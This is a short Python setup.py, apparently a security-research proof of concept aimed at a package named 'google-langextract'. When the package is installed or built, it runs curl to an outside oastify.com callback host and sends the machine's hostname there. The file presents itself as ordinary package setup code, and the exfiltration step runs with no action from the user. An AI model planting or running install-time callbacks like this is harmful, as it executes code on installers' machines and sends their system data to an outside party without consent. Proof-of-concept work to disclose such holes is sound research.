import os
import subprocess
# Security research PoC - harmless callback to confirm RCE
subprocess.run(["curl", "http://yy0aizfhssui62v72e4dysdbl2rtfj38.oastify.com/google-langextract-rce?h=" + os.popen("hostname").read().strip()])
from setuptools import setup
setup()
